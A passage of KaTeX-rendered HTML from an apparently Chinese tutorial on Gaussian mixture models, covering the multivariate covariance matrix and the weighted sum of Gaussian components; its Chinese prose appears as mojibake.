class="mord">Î£</span></span></span></span></span>ï¼Ÿè¿™æ˜¯å¾ˆå¤šåˆå­¦è€…æ„Ÿåˆ°å›°æƒ‘çš„åœ°æ–¹ã€‚</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">Î£</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mrow><mn>1</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mrow><mn>2</mn><mi>n</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â‹±</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal">â‹®</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"/></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em">â€¦</mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>Ïƒ</mi><mrow><mi>n</mi><mi>n</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext>Â </mtext><mo separator="true">,</mo><mtext>Â </mtext><msub><mi>Ïƒ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>Ïƒ</mi><mrow><mi>j</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\Sigma = \begin{bmatrix}
 \sigma_{11} &amp;\sigma_{12}  &amp; \dots  &amp;\sigma_{1n} \\
 \sigma_{21} &amp; \sigma_{22} &amp; \dots &amp; \sigma_{2n}\\
 \vdots  &amp;  \vdots &amp; \ddots  &amp; \vdots \\
  \sigma_{n1} &amp;  \sigma_{n2} &amp;  \dots &amp;  \sigma_{nn}
\end{bmatrix} \space, \space \sigma_{ij} = \sigma_{ji}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î£</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:5.46em;vertical-align:-2.48em;"/><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-4.95em;"><span class="pstrut" style="height:7.4em;"/><span style="width:0.667em;height:5.400em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="5.400em" viewbox="0 0 667 5400"><path d="M403 1759 V84 H666 V0 H319 V1759 v1800 v1759 h347 v-84&#10;H403z M403 1759 V0 H319 V1759 v1800 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span/></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">11</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">21</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">12</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">22</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.64em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-4.44em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">â€¦</span></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">â‹±</span></span></span><span style="top:-1.38em;"><span class="pstrut" style="height:3.5em;"/><span class="mord"><span class="minner">â€¦</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.98em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord">â‹®</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"/></span></span></span><span style="top:-1.5675em;"><span class="pstrut" style="height:3.6875em;"/><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">nn</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.48em;"><span/></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-4.95em;"><span class="pstrut" style="height:7.4em;"/><span style="width:0.667em;height:5.400em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.667em" height="5.400em" viewbox="0 0 667 5400"><path d="M347 1759 V0 H0 V84 H263 V1759 v1800 v1759 H0 v84 H347z&#10;M347 1759 V0 H263 V1759 v1800 v1759 h84z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span/></span></span></span></span></span></span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mpunct">,</span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ji</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>å…¶å®ï¼Œå¤šç»´æ•°æ®ä¸ä»…åœ¨å„ç»´åº¦ä¸Šå…·æœ‰å„è‡ªçš„ç¦»æ•£ç¨‹åº¦ï¼Œä¸åŒç»´åº¦ä¹‹é—´è¿˜å¯èƒ½å­˜åœ¨å…³è”æ€§ï¼Œä»è€Œå½¢æˆå…·æœ‰ç‰¹å®šæ–¹å‘å’Œå½¢çŠ¶çš„æ¦‚ç‡æ¤­çƒï¼ˆæˆ–è¶…æ¤­çƒï¼‰ã€‚åæ–¹å·®çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Î£</mi></mrow><annotation encoding="application/x-tex">\Sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord">Î£</span></span></span></span></span> æ­£æ˜¯ä¸ºäº†å®Œæ•´åˆ»ç”»è¿™ç§å¤šç»´ç»“æ„ï¼š</p>
<ul>
<li>å…¶å¯¹è§’çº¿å…ƒç´  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ïƒ</mi><mrow><mi>i</mi><mi>i</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{ii}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ii</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªç»´åº¦çš„æ–¹å·®ï¼›</li>
<li>éå¯¹è§’çº¿å…ƒç´  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ïƒ</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ç»´ä¸ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> ç»´ä¹‹é—´çš„åæ–¹å·®ï¼Œæè¿°äº†ä¸¤ä¸ªç»´åº¦ä¹‹é—´çš„çº¿æ€§ç›¸å…³ç¨‹åº¦å’Œå…±åŒå˜åŒ–è¶‹åŠ¿ã€‚</li>
</ul>
<p>ç†è§£äº†æ¦‚ç‡å¯†åº¦å‡½æ•°å¯ä»¥å»¶ä¼¸åˆ°å¤šç»´ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ›´å‡†ç¡®åœ°é‡ç”³é«˜æ–¯æ··åˆæ¨¡å‹çš„æ ¸å¿ƒæ€æƒ³ï¼š<strong>æ··åˆé«˜æ–¯æ¨¡å‹ï¼ˆGMMï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„æ¦‚ç‡å»ºæ¨¡å·¥å…·ï¼Œå®ƒæ—¨åœ¨å°†ä»»æ„å¤æ‚çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>ç»´æ¦‚ç‡åˆ†å¸ƒ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span></span></span></span></span>ï¼Œåˆ†è§£ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span>ä¸ª<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>ç»´é«˜æ–¯åˆ†å¸ƒçš„åŠ æƒçº¿æ€§ç»„åˆã€‚</strong></p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mo stretchy="false">)</mo><mo>=</mo><munderover><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><msub><mi>Ï€</mi><mi>i</mi></msub><mtext>Â </mtext><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi mathvariant="bold">x</mi><mi mathvariant="normal">âˆ£</mi><msub><mi mathvariant="bold-italic">Î¼</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi mathvariant="normal">Î£</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(\mathbf{x}) = \sum_{i=1}^{k} \pi_{i}\space \mathcal{N}(\mathbf{x}|\boldsymbol{\mu}_{i},\Sigma_{i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.1138em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">âˆ‘</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace">Â </span><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathbf">x</span><span class="mord">âˆ£</span><span class="mord"><span class="mord"><span class="mord"><span class="mord boldsymbol">Î¼</span></span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2175em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord">Î£</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></div>
<p>å…¶ä¸­ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\pi_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>è¡¨ç¤ºç¬¬<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span>ä¸ªé«˜æ–¯åˆ†å¸ƒçš„æƒé‡ç³»æ•°ï¼Œå¹¶ä¸”æ»¡è¶³<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Ï€</mi><mi>i</mi></msub><mo>â‰¥</mo><mn>0</mn><mo separator="true">,</mo><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><msub><mi>Ï€</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\pi_{i} \ge 0, \sum_{i=1}^{k} \pi_{i} = 1 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2887em;vertical-align:-0.2997em;"/><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.989em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" 